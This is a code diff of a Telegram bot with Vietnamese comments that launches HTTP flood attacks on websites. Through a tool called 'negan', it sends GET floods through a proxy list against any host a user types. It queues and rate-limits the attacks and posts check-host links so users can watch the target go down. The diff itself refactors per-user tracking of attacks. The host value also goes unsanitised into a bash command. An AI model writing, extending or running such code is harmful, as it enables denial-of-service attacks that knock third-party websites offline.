@@ -11,7 +11,7 @@ const maxConcurrentAttacks = 3, maxSlot = 1, maxTimeAttacks = 120;
 // Khởi tạo bot
 const bot = new TelegramBot(token, { polling: true });
 const currentAttacks = new Map(), attackQueue = [];
-const userProcesses = new Map(); // Lưu trữ tiến trình của người dùng
+const userProcesses = new Map(); // Lưu trữ tiến trình của người dùng bằng user ID
 
 // Thông báo bot đã sẵn sàng
 let isBotReady = true;
@@ -31,31 +31,32 @@ const sendMarkdownMessage = async (chatId, message) => {
 };
 
 // Hàm thực thi lệnh
-const executeCommand = async (chatId, command, host, time, username) => {
+const executeCommand = async (chatId, command, host, time, username, userId) => {
     const pid = Math.floor(Math.random() * 10000);
     const startMessage = `🚀 Successfully 🚀\nPID: ${pid}\nWEBSITE: ${host}\nTime: ${time} Seconds\nCaller: @${username}\nMax concurrent attacks: ${maxSlot} slots\n[Check Host](https://check-host.net/check-http?host=${host}) | [Host Tracker](https://www.host-tracker.com/en/ic/check-http?url=${host})`;
     await sendMarkdownMessage(chatId, startMessage);
 
     const child = exec(command, { shell: '/bin/bash' });
-    userProcesses.set(chatId, { pid, startTime: Date.now(), time }); // Lưu tiến trình của người dùng
+    userProcesses.set(userId, { pid, startTime: Date.now(), time }); // Lưu tiến trình của người dùng bằng user ID
 
     child.on('close', () => {
         const endTime = getVietnamTime();
         const completeMessage = `✅ Process Completed:\nPID: ${pid}\nWEBSITE: ${host}\nTime: ${time} Seconds\nCaller: @${username}\nEnd Time: ${endTime}`;
         sendMarkdownMessage(chatId, completeMessage);
-        currentAttacks.delete(chatId);
-        userProcesses.delete(chatId); // Xóa tiến trình của người dùng khi hoàn thành
+        currentAttacks.delete(userId); // Xóa tiến trình của người dùng khi hoàn thành
+        userProcesses.delete(userId);
         if (attackQueue.length > 0) {
             const nextAttack = attackQueue.shift();
-            executeCommand(nextAttack.chatId, nextAttack.command, nextAttack.host, nextAttack.time, nextAttack.username);
+            executeCommand(nextAttack.chatId, nextAttack.command, nextAttack.host, nextAttack.time, nextAttack.username, nextAttack.userId);
         }
     });
 };
 
 // Xử lý lệnh từ người dùng
 bot.on('message', async (msg) => {
-    const chatId = msg.chat.id, text = msg.text, isAdmin = chatId === adminId, isGroup = allowedGroupIds.has(chatId);
+    const chatId = msg.chat.id, text = msg.text, isAdmin = msg.from.id === adminId, isGroup = allowedGroupIds.has(chatId);
     const username = msg.from.username || msg.from.first_name;
+    const userId = msg.from.id; // Lấy user ID của người dùng
 
     // Kiểm tra quyền thực thi lệnh
     if (!isAdmin && !isGroup) return sendMarkdownMessage(chatId, '🚫 You do not have permission to execute this command.');
@@ -68,20 +69,20 @@ bot.on('message', async (msg) => {
         if (time > maxTimeAttacks) return sendMarkdownMessage(chatId, `🚫 Maximum time is ${maxTimeAttacks} seconds.`);
 
         // Kiểm tra xem người dùng có tiến trình đang chạy không
-        if (userProcesses.has(chatId)) {
-            const remainingTime = userProcesses.get(chatId).time - (Date.now() - userProcesses.get(chatId).startTime) / 1000;
+        if (userProcesses.has(userId)) {
+            const remainingTime = userProcesses.get(userId).time - (Date.now() - userProcesses.get(userId).startTime) / 1000;
             return sendMarkdownMessage(chatId, `🚫 You already have a running command. Please wait for the current process to complete. Remaining time: ${Math.ceil(remainingTime)} seconds.`);
         }
 
         // Kiểm tra số lệnh đang chạy toàn hệ thống
         if (currentAttacks.size >= maxConcurrentAttacks) {
-            attackQueue.push({ chatId, command: `node ./negan -m GET -u ${host} -p live.txt --full true -s ${time}`, host, time, username });
+            attackQueue.push({ chatId, command: `node ./negan -m GET -u ${host} -p live.txt --full true -s ${time}`, host, time, username, userId });
             return sendMarkdownMessage(chatId, '⏳ Your command has been added to the queue. Please wait...');
         }
 
         const command = `node ./negan -m GET -u ${host} -p live.txt --full true -s ${time}`;
-        currentAttacks.set(chatId, { user: chatId, command, startTime: Date.now() });
-        executeCommand(chatId, command, host, time, username);
+        currentAttacks.set(userId, { user: userId, command, startTime: Date.now() });
+        executeCommand(chatId, command, host, time, username, userId);
         return;
     }
 
